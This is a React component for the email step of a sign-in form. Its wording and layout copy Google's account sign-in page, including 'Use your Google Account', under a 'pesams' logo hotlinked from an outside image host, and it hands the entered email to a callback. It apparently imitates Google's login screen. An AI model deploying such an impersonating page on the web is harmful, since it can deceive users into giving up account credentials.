import { useState } from "react";
import "./SignIn.css";

function EmailStep({ onComplete }) {
  const [email, setEmail] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();

    setError("");

    if (!email.trim()) {
      setError("Enter an email address");
      return;
    }

    setLoading(true);

    try {
      // Keep the loading animation visible for 2 seconds
      await new Promise((resolve) => {
        setTimeout(resolve, 2000);
      });

      await onComplete(email.trim());

    } catch (err) {
      console.error(err);
      setError("Something went wrong");
      setLoading(false);
    }
  };

  return (
    <div className="signin-page">

      <div className="signin-card">

        {/* TOP LOADING ANIMATION */}
        {loading && (
          <div className="processing-loader">
            <div className="processing-loader-bar"></div>
          </div>
        )}

        {/* LEFT SIDE */}
        <div className="signin-left">

          <div className="pesams-brand">

            <div className="pesams-l">
              <img className="pesams-logo" src="https://tse3.mm.bing.net/th/id/OIP._YRByM7l5SCayIje5TRfuwHaHj?r=0&rs=1&pid=ImgDetMain&o=7&rm=3" alt="" />
            </div>

          

          </div>

          <h1>
            Sign in
          </h1>

          <p className="signin-subtitle">
            Use your Google Account
          </p>

        </div>


        {/* RIGHT SIDE */}
        <div className="signin-right">

          <form onSubmit={handleSubmit}>

            <div className="input-container">

              <input
                id="email"
                type="email"
                value={email}
                onChange={(e) =>
                  setEmail(e.target.value)
                }
                disabled={loading}
                autoComplete="email"
                autoFocus
                placeholder=" "
                required
              />

              <label htmlFor="email">
                Email or phone
              </label>

            </div>


            {error && (
              <p className="error-message">
                {error}
              </p>
            )}


            <button
              type="button"
              className="text-button"
            >
              Forgot email?
            </button>


            <p className="info-text">
            Not your computer? Use Guest mode to sign in privately. <span  className="link">Learn more about using Guest mode</span>
            </p>


            <div className="button-container">
              <button
              type="button"
              className="text-button"
            >
              Create account
            </button>

              <button
                type="submit"
                className="next-button"
                disabled={loading}
              >
                {loading
                  ? "Please wait..."
                  : "Next"}
              </button>

            </div>

          </form>

        </div>

      </div>


      {/* FOOTER */}
      <footer className="signin-footer">

        <button className="language-button">
          English
          <span>⌄</span>
        </button>

        <div className="footer-links">

          <button type="button">
            Help
          </button>

          <button type="button">
            Privacy
          </button>

          <button type="button">
            Terms
          </button>

        </div>

      </footer>

    </div>
  );
}

export default EmailStep;